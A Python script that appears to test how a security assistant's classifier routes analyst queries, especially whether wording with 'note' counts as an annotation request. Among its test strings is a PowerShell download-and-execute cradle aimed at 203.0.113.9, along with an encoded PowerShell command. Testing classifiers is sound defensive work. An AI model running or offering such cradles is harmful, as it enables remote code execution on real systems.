import sys
sys.path.insert(0, "/home/burhan/auspex-new")
from auspex.classify.classifier import classify, asks_for_note, is_note_request
from auspex.classify import shortcut_answer
from auspex.modes.resolver import resolve_mode
qs = [
 "check 8.8.8.8 — note: it was made by our scanner",
 "check 8.8.8.8, note it was made by our scanner",
 "check 203.0.113.9 please note it's our scanner",
 "what's the MX record for evil[.]net?",
 "check the TXT record on evil[.]net",
 "is there an A record for evil[.]net",
 "record for 203.0.113.9?",
 "Note the timestamps on these events and tell me what happened on fin-ws-12",
 "Note - this came from the CEO's mailbox. Is hxxp://evil[.]net/x malicious?",
 "note, this is the third time 203.0.113.9 shows up — what is it?",
 "NOTE — 203.0.113.9 hit 40 hosts overnight, how bad is this?",
 "Note 203.0.113.9 appeared in three alerts; is it a C2?",
 "Note this: 203.0.113.9 beaconing every 60s from fin-ws-12. Assess.",
 "note how the attacker pivoted from fin-ws-12 to dc01 and explain the TTPs",
 "write a note to all staff warning them about this phishing campaign",
 "write a short note to the CISO summarizing the qakbot incident",
 "add comments to this sigma rule explaining each condition",
 "add a comment explaining each line of this powershell: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')",
 "Write a comment for this YARA rule",
 "leave a comment on the jira ticket saying we closed it",
 "log comments show 203.0.113.9 failed 400 logins",
 "Annotated screenshot attached — what's evil[.]net?",
 "please note that 203.0.113.9 belongs to our pentest vendor",
 "please note 203.0.113.9 is our scanner, so ignore it",
 "add a note to 203.0.113.9 and then tell me if it's malicious",
 "can you add a note to 203.0.113.9 saying it's a known scanner",
 "Hi, note 203.0.113.9 is the pen-test box",
 "ok note: 203.0.113.9 is the pen-test box",
 "Mark it down for 203.0.113.9",
 "please annotate the timeline of this incident with MITRE techniques",
 "annotate this powershell for me: powershell -enc SQBFAFgA",
 "note to self: check 203.0.113.9",
 "Note that 203.0.113.9 is ours",
 "note 203.0.113.9 is ours",
 "ｎｏｔｅ 203.0.113.9",
 "add a note to 203.0.113.9",
 "please put a note on 203.0.113.9: pentest",
 "put the note on 203.0.113.9",
 "record against 203.0.113.9: pentest",
 "a note was added to 203.0.113.9 by whom?",
 "attach a comment to CVE-2024-3400 saying patched",
 "add a remark to e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855: benign",
 "check 203.0.113.9 with a note",
 "who made you? add a note to 203.0.113.9",
 "add a note to 203.0.113.9",
 "pin a note on hxxps://evil[.]net/login",
 "note on that: pentest",
 "is 203.0.113.9 malicious? note on it: pentest",
]
for q in qs:
    c = classify(q)
    sc = shortcut_answer(c)
    route = "shortcut:" + c.category.value if sc else "deep→" + resolve_mode(q, c.observables).value
    print(f"ask={int(asks_for_note(q))} req={int(is_note_request(q))}  {route:24s} {q[:100]}")
